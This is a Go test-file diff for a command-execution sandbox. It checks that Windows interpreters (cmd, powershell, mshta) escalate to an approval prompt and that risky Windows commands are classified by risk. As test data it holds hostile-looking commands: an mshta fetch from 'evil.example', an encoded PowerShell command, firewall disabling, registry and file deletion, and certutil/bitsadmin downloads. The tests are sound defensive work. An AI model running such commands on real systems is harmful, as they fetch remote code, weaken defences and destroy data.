@@ -4,6 +4,7 @@ import (
 	"amurru/hakase/internal/sandbox"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"testing"
 )
@@ -681,6 +682,9 @@ func ss(args ...string) []string { return args }
 // TestSymlinkBypass verifies symlink resolution catches rename-type bypasses
 // (12.1). Uses real temp symlinks to prove resolution works.
 func TestSymlinkBypass(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("POSIX-only: /bin symlink layout does not exist on Windows")
+	}
 	// Check that /bin/rm exists; skip gracefully if not.
 	if _, err := os.Stat("/bin/rm"); err != nil {
 		t.Skip("/bin/rm not found on this system")
@@ -860,6 +864,9 @@ func TestInterpreterEscalation(t *testing.T) {
 
 // TestScriptContentScan verifies heuristic script-content scanning (12.3).
 func TestScriptContentScan(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("POSIX-only: scans #!/bin/bash script files")
+	}
 	paths := &sandbox.SandboxConfig{
 		Mode:        sandbox.SandboxModePaths,
 		Permissions: map[string]string{"system_exec": "ask"},
@@ -1015,15 +1022,17 @@ func TestResolveBinaryBase(t *testing.T) {
 		t.Errorf("resolveBinaryBase(%s) = %q, want ls", link, got)
 	}
 
-	// Symlink to rm.
+	// Symlink to rm (POSIX-only; skipped on Windows).
 	rmLink := filepath.Join(dir, "notrm")
-	if _, err := os.Stat("/bin/rm"); err == nil {
-		if err := os.Symlink("/bin/rm", rmLink); err != nil {
-			t.Fatalf("symlink rm: %v", err)
-		}
-		got := resolveBinaryBase(rmLink)
-		if got != "rm" {
-			t.Errorf("resolveBinaryBase(%s) = %q, want rm", rmLink, got)
+	if runtime.GOOS != "windows" {
+		if _, err := os.Stat("/bin/rm"); err == nil {
+			if err := os.Symlink("/bin/rm", rmLink); err != nil {
+				t.Fatalf("symlink rm: %v", err)
+			}
+			got := resolveBinaryBase(rmLink)
+			if got != "rm" {
+				t.Errorf("resolveBinaryBase(%s) = %q, want rm", rmLink, got)
+			}
 		}
 	}
 
@@ -1150,5 +1159,108 @@ func TestGateRegression(t *testing.T) {
 	dec = EvaluateCommand(paths, "some_tool", nil)
 	if dec.Action != ActionAsk {
 		t.Errorf("unknown binary should ask, got %s", dec.Action)
+	}
+}
+
+// TestWindowsInterpreterEscalation pins the Windows gate classification
+// (WIN-003): cmd/powershell-family interpreters escalate opaque code to ask
+// regardless of permission mode, and never ride a permissions allow
+// shortcut. These are pure-logic tests, valid on every OS.
+func TestWindowsInterpreterEscalation(t *testing.T) {
+	ask := &sandbox.SandboxConfig{
+		Mode:        sandbox.SandboxModePaths,
+		Permissions: map[string]string{"system_exec": "ask"},
+	}
+	allow := &sandbox.SandboxConfig{
+		Mode:        sandbox.SandboxModePaths,
+		Permissions: map[string]string{"system_exec": "allow"},
+	}
+
+	escalated := []struct {
+		cmd  string
+		args []string
+	}{
+		{"cmd", ss("/D", "/C", "echo hi")},
+		{"cmd", ss("/C", "del /q file.txt")},
+		{"powershell", ss("-Command", "Remove-Item C:\\x")},
+		{"powershell", ss("-EncodedCommand", "IgBlAGMAaABvACIA")},
+		{"powershell", ss("-File", "script.ps1")},
+		{"pwsh", ss("-Command", "Get-Process")},
+		{"wscript", ss("script.vbs")},
+		{"cscript", ss("script.vbs")},
+		{"mshta", ss("http://evil.example/x.hta")},
+	}
+
+	for _, tt := range escalated {
+		t.Run(tt.cmd+"_ask", func(t *testing.T) {
+			dec := EvaluateCommand(ask, tt.cmd, tt.args)
+			if dec.Action != ActionAsk {
+				t.Fatalf("%s %v: want ask, got %s (risk=%s, reason=%s)", tt.cmd, tt.args, dec.Action, dec.Risk, dec.Reason)
+			}
+			if !strings.Contains(dec.Reason, "interpreter") {
+				t.Errorf("%s %v: reason should mention interpreter, got: %s", tt.cmd, tt.args, dec.Reason)
+			}
+		})
+		// Security-critical: the 12.2 interpreter escalation must run
+		// BEFORE the permissions allow shortcut, so opaque Windows
+		// shell/code never executes silently under system_exec: allow.
+		t.Run(tt.cmd+"_allow_still_asks", func(t *testing.T) {
+			dec := EvaluateCommand(allow, tt.cmd, tt.args)
+			if dec.Action != ActionAsk {
+				t.Errorf("%s %v under allow: want ask, got %s (reason=%s)", tt.cmd, tt.args, dec.Action, dec.Reason)
+			}
+		})
+	}
+
+	// String-form commands classify via inner tokens exactly as sh -c
+	// routing does on Linux: low-risk inner command stays allow.
+	dec := EvaluateCommand(allow, "echo hi", nil)
+	if dec.Action != ActionAllow {
+		t.Errorf("string-form 'echo hi' via inner tokens: want allow, got %s", dec.Action)
+	}
+}
+
+// TestHasOpaqueCodeArgWindowsSlashes pins that /C is treated as a non-flag
+// (opaque) argument by hasOpaqueCodeArg - intentional behavior so
+// cmd /C <string> escalates.
+func TestHasOpaqueCodeArgWindowsSlashes(t *testing.T) {
+	if !hasOpaqueCodeArg(ss("cmd", "/D", "/C", "echo hi")) {
+		t.Error("hasOpaqueCodeArg: /C must count as an opaque non-flag argument")
+	}
+	if hasOpaqueCodeArg(ss("cmd")) {
+		t.Error("hasOpaqueCodeArg: bare cmd with no args must not be opaque")
+	}
+}
+
+// TestWindowsRiskTableEntries pins the Windows risk-table additions
+// (WIN-003 4b).
+func TestWindowsRiskTableEntries(t *testing.T) {
+	high := [][]string{
+		{"del", "/q", "file.txt"},
+		{"rd", "/s", "/q", "dir"},
+	}
+	for _, argv := range high {
+		if got := classifyRisk(argv); got != RiskHigh {
+			t.Errorf("classifyRisk(%v): want high, got %s", argv, got)
+		}
+	}
+	medium := [][]string{
+		{"reg", "delete", "HKLM\\x"},
+		{"regsvr32", "/s", "evil.dll"},
+		{"schtasks", "/create", "/tn", "x"},
+		{"sc", "delete", "svc"},
+		{"netsh", "advfirewall", "set", "allprofiles", "state", "off"},
+		{"diskpart", "/s", "script.txt"},
+		{"certutil", "-urlcache", "-f", "http://x", "y"},
+		{"bitsadmin", "/transfer", "job", "http://x", "y"},
+	}
+	for _, argv := range medium {
+		if got := classifyRisk(argv); got != RiskMedium {
+			t.Errorf("classifyRisk(%v): want medium, got %s", argv, got)
+		}
+	}
+	// format was already high risk and stays.
+	if got := classifyRisk(ss("format", "C:")); got != RiskHigh {
+		t.Errorf("classifyRisk(format): want high, got %s", got)
 	}
 }
